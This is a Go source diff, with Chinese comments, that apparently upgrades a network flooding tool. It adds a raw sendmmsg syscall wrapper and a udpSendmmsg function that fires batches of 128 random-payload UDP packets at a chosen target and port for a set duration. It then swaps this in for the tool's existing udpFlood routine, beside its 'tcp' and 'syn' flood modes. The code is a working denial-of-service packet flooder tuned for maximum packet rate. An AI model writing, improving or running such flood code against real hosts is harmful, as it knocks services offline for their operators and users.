@@ -13,6 +13,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"syscall"
+	"unsafe"
 	"time"
 )
 
@@ -25,6 +26,114 @@ var (
 )
 
 // ==================== 统计输出 ====================
+
+// ==================== sendmmsg 批量发送（性能关键） ====================
+type iovec struct {
+	base *byte
+	len  uintptr
+}
+
+type msghdr struct {
+	name       *byte
+	namelen    uint32
+	iov        *iovec
+	iovlen     uintptr
+	control    *byte
+	controllen uintptr
+	flags      int32
+}
+
+type mmsghdr struct {
+	hdr  msghdr
+	len  uint32
+}
+
+func sendmmsgCall(fd int, msgvec *mmsghdr, vlen uint32) (uint32, error) {
+	r1, _, errno := syscall.Syscall6(syscall.SYS_SENDMMSG, uintptr(fd),
+		uintptr(unsafe.Pointer(msgvec)), uintptr(vlen), 0, 0, 0)
+	if errno != 0 {
+		return uint32(r1), errno
+	}
+	return uint32(r1), nil
+}
+
+func udpSendmmsg(target string, port int, concurrency int, packetSize int, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
+	defer wg.Done()
+	// 解析目标
+	ip := net.ParseIP(target)
+	if ip == nil {
+		addrs, err := net.LookupIP(target)
+		if err != nil || len(addrs) == 0 {
+			return
+		}
+		ip = addrs[0]
+	}
+	dst4 := ip.To4()
+	if dst4 == nil {
+		return
+	}
+	// 创建 UDP socket
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "socket失败: %v\n", err)
+		return
+	}
+	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 1<<20)
+	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
+	defer syscall.Close(fd)
+
+	// 目标地址
+	var sockaddr syscall.RawSockaddrInet4
+	sockaddr.Family = syscall.AF_INET
+	sockaddr.Port = uint16(port>>8) | uint16(port<<8) // 网络字节序
+	copy(sockaddr.Addr[:], dst4)
+
+	// 预分配批量包
+	const batch = 128
+	packets := make([][]byte, batch)
+	for i := 0; i < batch; i++ {
+		packets[i] = make([]byte, packetSize)
+	}
+	rand.Read(packets[0])
+	for i := 1; i < batch; i++ {
+		copy(packets[i], packets[0])
+	}
+
+	iovecs := make([]iovec, batch)
+	msgvec := make([]mmsghdr, batch)
+	deadline := time.Now().Add(duration)
+	var localPPS, localBytes int64
+
+	for {
+		select {
+		case <-stopCh:
+			return
+		default:
+		}
+		if time.Now().After(deadline) {
+			return
+		}
+		// 填充 iovec 和 mmsghdr
+		for i := 0; i < batch; i++ {
+			iovecs[i] = iovec{base: &packets[i][0], len: uintptr(packetSize)}
+			msgvec[i].hdr.name = (*byte)(unsafe.Pointer(&sockaddr))
+			msgvec[i].hdr.namelen = uint32(unsafe.Sizeof(sockaddr))
+			msgvec[i].hdr.iov = &iovecs[i]
+			msgvec[i].hdr.iovlen = 1
+		}
+		n, err := sendmmsgCall(fd, &msgvec[0], batch)
+		if err == nil && n > 0 {
+			localPPS += int64(n)
+			localBytes += int64(n) * int64(packetSize)
+			if localPPS >= 1024 {
+				atomic.AddInt64(&statPPS, localPPS)
+				atomic.AddInt64(&statBytes, localBytes)
+				localPPS, localBytes = 0, 0
+			}
+		}
+	}
+}
+
 func statsLoop() {
 	prevPPS := int64(0)
 	prevBytes := int64(0)
@@ -465,9 +574,10 @@ func main() {
 
 	switch *mode {
 	case "udp":
+		// 批量发送模式（高pps）
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go udpFlood(*target, *port, perCore, *bandwidth, *packet, dur, stopCh, &wg)
+			go udpSendmmsg(*target, *port, perCore, *packet, dur, stopCh, &wg)
 		}
 	case "tcp", "syn":
 		for i := 0; i < cores; i++ {
